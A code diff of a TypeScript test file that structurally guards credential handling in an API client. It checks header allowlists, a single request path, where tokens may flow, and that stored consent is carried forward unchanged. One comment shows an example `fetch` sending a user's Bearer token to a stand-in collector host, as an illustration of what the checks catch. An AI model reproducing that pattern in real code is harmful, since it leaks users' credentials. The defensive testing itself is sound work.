@@ -1,70 +1,52 @@
 /**
- * CREDENTIAL SHAPE: the things about `src/api.ts` that a behavioural test
- * cannot say, asserted against its source.
+ * Structural checks on how `src/api.ts` handles credentials: the properties a
+ * behavioural test cannot express, asserted against its source.
  *
- * WHY THIS FILE IS IN `scripts/`. That is the point of it, so it goes first.
+ * Why this lives in `scripts/`: `src/api.ts` attaches every outbound credential
+ * (the `Bearer` access token and the `x-wego-id-token` identity assertion) but
+ * is deliberately not in `.github/CODEOWNERS`, because owning ~1,700 churning
+ * lines would put the release signers on nearly every pull request. The repo is
+ * public and takes outside contributions, so a change to how a credential is
+ * sent otherwise needs only one ordinary reviewer. `scripts/` is code-owned:
+ * loosening credential handling in `src/api.ts` fails this file, and silencing
+ * this file needs a release signer.
  *
- * `src/api.ts` attaches every outbound credential — the `Bearer` access token
- * and the `x-wego-id-token` identity assertion — and is deliberately NOT in
- * `.github/CODEOWNERS`: owning ~1,700 churning lines would put the three
- * release signers on nearly every pull request, the bottleneck the missing `*`
- * line exists to avoid. This repository is public and takes outside
- * contributions, so a plausible-looking change to where or under what condition
- * a credential is sent otherwise needs one ordinary reviewer.
+ * Split with `src/api.test.ts`:
  *
- * `scripts/` IS code-owned, so the gate and the thing that can weaken the gate
- * sit at different review bars: loosening credential handling in `src/api.ts`
- * fails this file, and silencing this file needs a release signer.
- *
- * WHAT BELONGS HERE, AND WHAT DOES NOT. This is the structural half of a pair.
- *
- *   - `src/api.test.ts` owns BEHAVIOUR, and owns it better than source-reading
- *     ever could: it drives the real functions through the injected `HttpFetch`
- *     and inspects the `Headers` that come out. "The Bearer header carries the
- *     token it was passed", "a declining user sends no id-token", "a refresh
- *     cannot turn the header on for someone who opted out" are all tested
- *     there, against running code, and they survive any refactor.
- *   - This file owns ABSENCE — the claims a behavioural test structurally
- *     cannot make, because you cannot call a function and observe the headers
- *     it DIDN'T send, or the request path that DOESN'T exist:
+ *   - `src/api.test.ts` owns behaviour. It drives the real functions through
+ *     the injected `HttpFetch` and inspects the resulting `Headers`, which
+ *     survives any refactor.
+ *   - This file owns absence, which a behavioural test cannot observe:
  *
  *         "no header leaves this file that is not on a list"
  *         "there is exactly one place that issues a request"
  *         "a credential never reaches a URL, a body, or any other call"
  *
- * An earlier version of this file also re-asserted the behavioural properties
- * structurally. That was duplication in a worse form — it failed four of five
- * behaviour-preserving edits while `src/api.test.ts` passed all five — so those
- * assertions are gone. Before adding a rule here, check whether it can be
- * written as a behavioural test in `src/api.test.ts` instead. If it can, it
- * belongs there.
+ * Re-asserting behavioural properties structurally here is brittle (it breaks
+ * on behaviour-preserving edits that `src/api.test.ts` passes). Before adding a
+ * rule, check whether it can be a behavioural test in `src/api.test.ts`; if it
+ * can, it belongs there.
  *
- * WHAT THIS DOES NOT PROTECT. A reader who over-trusts it is a worse outcome
- * than not having it:
+ * Limits:
  *
- *   - It asserts what it asserts. A sufficiently novel credential path can be
- *     written to satisfy every rule below — most obviously one that lives in
- *     another module entirely.
- *   - A reviewer still has to think. This narrows what can be done QUIETLY; it
- *     is friction and detection, not prevention.
- *   - It does not protect `src/api.ts` from a release signer, and is not meant
- *     to. The threat model is an outsider's pull request seen by one ordinary
- *     reviewer.
- *   - The collectors fail closed on shapes they cannot read, but "fails closed
- *     on what it can see" is still not "sees everything".
+ *   - A novel credential path can satisfy every rule below, most obviously one
+ *     in another module. This is friction and detection, not prevention; a
+ *     reviewer still has to think.
+ *   - It does not protect `src/api.ts` from a release signer. The threat model
+ *     is an outsider's pull request seen by one ordinary reviewer.
+ *   - The collectors fail closed on shapes they cannot read, but that is not the
+ *     same as seeing everything.
  *
- * The stronger fix is a separate, owned `src/api-credentials.ts`: an owned
- * module makes this class of change impossible rather than merely detectable,
- * and would reduce this file to its header allowlist. That is tracked
- * separately; this is what is cheap today.
+ * The stronger fix is a separate, owned `src/api-credentials.ts`, which would
+ * make this class of change impossible rather than detectable and reduce this
+ * file to its header allowlist. That is tracked separately.
  *
- * WHY A TYPE CHECKER. Two rules are about BINDING, not text — "this call
- * reaches the network through the injected parameter", "this value came from
- * the credential". Name matching cannot answer either, so symbols are resolved.
- * `typescript` already backs `bun run typecheck`, and `noResolve`/`noLib` keep
- * the program to this one file. `bun run test` runs only in unprivileged jobs —
- * `ci-cli`, and `release-cli.yml`'s `prepare`, which holds neither
- * `id-token: write` nor the store environment.
+ * A type checker is used because two rules are about binding, not text ("this
+ * call goes through the injected parameter", "this value came from the
+ * credential"), which name matching cannot answer. `noResolve`/`noLib` keep the
+ * program to this one file. `bun run test` runs only in unprivileged jobs
+ * (`ci-cli`, and `release-cli.yml`'s `prepare`, which holds neither
+ * `id-token: write` nor the store environment).
  */
 import { describe, expect, it } from "bun:test";
 import ts from "typescript";
@@ -88,7 +70,6 @@ const where = (node: ts.Node): string => {
 
 const normalize = (text: string): string => text.replace(/\s+/g, " ").trim();
 
-/** A node with its location — the shape a failure message wants. */
 const cite = (node: ts.Node): string =>
   `${where(node)}: ${normalize(node.getText(sourceFile))}`;
 
@@ -112,10 +93,9 @@ function staticName(node: ts.Node | undefined): string | undefined {
 /** Header names are case-insensitive on the wire, so comparisons here are too. */
 const headerKey = (name: string): string => name.toLowerCase();
 
-/** Where an identifier is DECLARED, via the checker rather than by its text.
- *  `{ ...rest, token }` needs the shorthand detour: the identifier there is the
- *  PROPERTY's name, so asking about it directly returns the property symbol and
- *  the value being read is silently missed. */
+/** Resolved via the checker rather than by text. `{ ...rest, token }` needs the
+ *  shorthand branch: the identifier there is the property's name, so asking
+ *  about it directly returns the property symbol and misses the value read. */
 function declarationOf(node: ts.Node): ts.Declaration | undefined {
   const target =
     ts.isIdentifier(node) && ts.isShorthandPropertyAssignment(node.parent)
@@ -127,7 +107,6 @@ function declarationOf(node: ts.Node): ts.Declaration | undefined {
   return symbol?.declarations?.[0];
 }
 
-/** True when `node` resolves to a parameter of `fn` itself. */
 function isParameterOf(
   node: ts.Node,
   fn: ts.SignatureDeclaration | undefined,
@@ -155,7 +134,7 @@ function enclosingFunctionName(node: ts.Node): string {
 }
 
 // ---------------------------------------------------------------------------
-// Header bags — what counts as one, and the rule that an unfamiliar one fails
+// Header bags: what counts as one, and the rule that an unfamiliar one fails
 // ---------------------------------------------------------------------------
 
 /** Every identifier bound to a `new Headers(...)`. */
@@ -202,8 +181,7 @@ const headerProperties = allNodes.filter(
     ts.isPropertyAssignment(node) && staticName(node.name) === "headers",
 );
 
-/** Every member of an inline header object, INCLUDING spreads — dropping them
- *  here is how a collector goes quiet. */
+/** Includes spreads: dropping them here would let a spread go unchecked. */
 const inlineHeaderMembers = headerProperties
   .filter((node) => ts.isObjectLiteralExpression(node.initializer))
   .flatMap(
@@ -215,13 +193,11 @@ const inlineHeaderMembers = headerProperties
 // ---------------------------------------------------------------------------
 
 /**
- * EVERY header name `src/api.ts` may attach through a header bag, and what each
- * carries. This list is why the file exists: it fails by DEFAULT on anything
- * new, so a header nobody anticipated cannot be added quietly.
+ * Every header name `src/api.ts` may attach through a header bag, and what each
+ * carries. Anything not listed fails, so a new header cannot be added quietly.
  *
- * To add one: add it here, in the same pull request, with a line saying what it
- * carries. That edit is in `scripts/`, so it needs a release signer — which is
- * the review a new outbound header deserves.
+ * To add one, add it here in the same pull request with what it carries. The
+ * edit is in `scripts/`, so it needs a release signer.
  */
 const ALLOWED_SET_HEADERS: Record<string, string> = {
   "user-agent": "build identification; carries no user data",
@@ -249,8 +225,8 @@ const listedAs = (name: string | undefined, node: ts.Node): string =>
 
 describe("no header leaves this file without being listed here", () => {
   it("builds exactly one header bag", () => {
-    // The NUMBER of bags is the property; the NAME is not. One bag is why
-    // "every header this file sends" is a list somebody can finish reading.
+    // The count is the property, not the name: one bag keeps "every header
+    // this file sends" a list a reviewer can read in full.
     expect({ bags: [...headerBagNames], count: headerBagNames.size }).toEqual({
       bags: [...headerBagNames],
       count: 1,
@@ -268,8 +244,7 @@ describe("no header leaves this file without being listed here", () => {
 
   it("builds every inline header bag as a plain object literal", () => {
     // `headers: buildHeaders(token)` moves the decision somewhere this file
-    // cannot see. Fail rather than skip: a bag the collector cannot read is the
-    // case an allowlist is worth least in.
+    // cannot see, so fail rather than skip it.
     const opaque = headerProperties
       .filter((node) => !ts.isObjectLiteralExpression(node.initializer))
       .map(cite);
@@ -300,17 +275,17 @@ describe("no header leaves this file without being listed here", () => {
 // ---------------------------------------------------------------------------
 
 /**
- * `src/api.test.ts` can prove the headers a request DOES carry. It cannot prove
- * that no other request exists — and this line satisfies every header rule
- * above while shipping the user's token to a host nobody chose:
+ * `src/api.test.ts` can prove the headers a request carries, but not that no
+ * other request exists. This satisfies every header rule above while sending
+ * the user's token to an arbitrary host:
  *
  *     await fetch("https://collector.example/ingest", {
  *       headers: { Authorization: `Bearer ${accessToken}` },
  *     });
  *
- * `src/target.ts` and `src/config.ts`, both already code-owned, decide which
- * host may receive a credential and refuse cleartext. This is what stops
- * `src/api.ts` going around them.
+ * `src/target.ts` and `src/config.ts` (both code-owned) decide which host may
+ * receive a credential and refuse cleartext. These rules stop `src/api.ts`
+ * going around them.
  */
 const REQUEST_CHOKEPOINT = "fetchOrUnreachable";
 const ALLOWED_CHOKEPOINT_CALLERS: Record<string, string> = {
@@ -325,9 +300,9 @@ const chokepoint = allNodes.find(
 
 describe("exactly one place issues a request", () => {
   it("references the global fetch only as the injected default", () => {
-    // `http: HttpFetch = fetch` is the ONE permitted mention — it is what makes
-    // the transport swappable, and what `src/api.test.ts` drives. Any other
-    // `fetch` here is a second door.
+    // `http: HttpFetch = fetch` is the one permitted mention: it makes the
+    // transport swappable for `src/api.test.ts`. Any other `fetch` here is a
+    // second request path.
     const stray = allNodes
       .filter(
         (node): node is ts.Identifier =>
@@ -339,8 +314,8 @@ describe("exactly one place issues a request", () => {
   });
 
   it("reaches the network only through the injected transport", () => {
-    // Also pins that the chokepoint still exists: renamed away, the caller rule
-    // below would otherwise stop applying silently.
+    // Also pins that the chokepoint still exists: if it were renamed, the
+    // caller rule below would silently stop applying.
     expect(chokepoint?.body).toBeDefined();
     const viaInjected = [...walk(chokepoint?.body as ts.Node)]
       .filter(ts.isCallExpression)
@@ -349,8 +324,8 @@ describe("exactly one place issues a request", () => {
   });
 
   it("is reached only from the allowlisted callers", () => {
-    // The fails-by-default half. A new request path — a new endpoint, a retry
-    // helper, a "quick" health check — has to add its name here first.
+    // Fails by default: a new request path (endpoint, retry helper, health
+    // check) has to add its name here first.
     const callers = allNodes
       .filter(
         (node): node is ts.CallExpression =>
@@ -382,8 +357,8 @@ function parameterReceiving(
   return callee.parameters[index];
 }
 
-/** True when `node` is the single interpolation of a `Bearer ` template — the
- *  one place a credential may become text. */
+/** The single interpolation of a `Bearer ` template is the one place a
+ *  credential may become text. */
 function isTheBearerInterpolation(node: ts.Node): boolean {
   const span = node.parent;
   if (span === undefined || !ts.isTemplateSpan(span)) return false;
@@ -396,8 +371,8 @@ function isTheBearerInterpolation(node: ts.Node): boolean {
 }
 
 /**
- * THE CREDENTIAL PARAMETERS, derived rather than named — a guard that depends
- * on an identifier is a guard an ordinary rename switches off.
+ * The credential parameters, derived rather than named, so a rename cannot
+ * switch the guard off.
  *
  *   SEED     every parameter interpolated into a `Bearer ` template.
  *   CLOSURE  any parameter passed into a credential parameter's position is
@@ -446,16 +421,14 @@ describe("a credential is only forwarded, or put in the Bearer header", () => {
 
   it("found the credential parameters to check", () => {
     // Without this the rule below is vacuous: if the seed stops matching, the
-    // set is empty, every filter yields nothing, and this goes green having
-    // checked nothing at all.
+    // set is empty and the check passes having checked nothing.
     expect(credentialParams.size).toBeGreaterThan(0);
     expect(references.length).toBeGreaterThan(0);
   });
 
   it("never lets a credential reach a URL, a body, or any other call", () => {
-    // The rule the header allowlists cannot express. A token concatenated into
-    // a URL, packed into a JSON body, or handed to a logger never touches a
-    // header at all — so every rule above stays silent on it.
+    // The header allowlists cannot catch a token put into a URL, a JSON body
+    // or a logger, since it never touches a header.
     const escaped = references
       .filter((node) => {
         const target = parameterReceiving(node);
@@ -472,24 +445,21 @@ describe("a credential is only forwarded, or put in the Bearer header", () => {
 // ---------------------------------------------------------------------------
 
 /**
- * The one behavioural property that is ALSO kept here, deliberately.
+ * The one behavioural property deliberately also checked here.
  *
- * `src/api.test.ts` tests it properly — "a refresh cannot turn the header on
- * for someone who opted out" — but that file is unowned, so one pull request
- * could flip the behaviour and delete the test that noticed. Every other rule
- * in this file would stay green: the header name is allowlisted, no new request
- * appears, no credential moves. Silently sending an identity assertion for a
- * user who declined is the quietest bad change available in `src/api.ts`, which
- * is why it gets a second, owned guard.
+ * `src/api.test.ts` tests "a refresh cannot turn the header on for someone who
+ * opted out", but that file is unowned, so one pull request could flip the
+ * behaviour and delete the test. Every other rule here would stay green (the
+ * header is allowlisted, no new request, no credential moves). Sending an
+ * identity assertion for a user who declined is the quietest bad change
+ * possible in `src/api.ts`, so it gets a second, owned guard.
  */
 const CONSENT_CONJUNCTS = [
   "identityAssertion.allowed",
   "identityAssertion.token",
 ];
 
-/** Flatten an `&&` chain into its operands, so `a && b` and `b && a` are the
- *  same guard — a rule that accepts one spelling only teaches people to edit
- *  the rule rather than read it. */
+/** Flattens an `&&` chain so `a && b` and `b && a` count as the same guard. */
 function conjunctsOf(expr: ts.Expression): string[] {
   if (
     ts.isBinaryExpression(expr) &&
@@ -532,9 +502,9 @@ describe("consent is never re-decided", () => {
 
   it("never gives `allowed` a value other than the one already stored", () => {
     // Reading the stored consent back is fine; deciding a new one is not. The
-    // rule is about the VALUE, not the mention — `{ ...identityAssertion,
-    // token }` and `{ token, allowed: identityAssertion.allowed }` are the same
-    // program, and both must pass.
+    // rule is about the value, not the mention: `{ ...identityAssertion,
+    // token }` and `{ token, allowed: identityAssertion.allowed }` must both
+    // pass.
     expect(refresh?.body).toBeDefined();
     const CARRIED_FORWARD = "identityAssertion.allowed";
 
@@ -572,7 +542,7 @@ describe("consent is never re-decided", () => {
   });
 
   it("uses no computed property name in the refresh", () => {
-    // `{ ["allow" + "ed"]: true }` would sail past the rule above, and has no
+    // `{ ["allow" + "ed"]: true }` would evade the rule above, and has no
     // legitimate use in a three-line function.
     const computed = refreshNodes
       .filter(
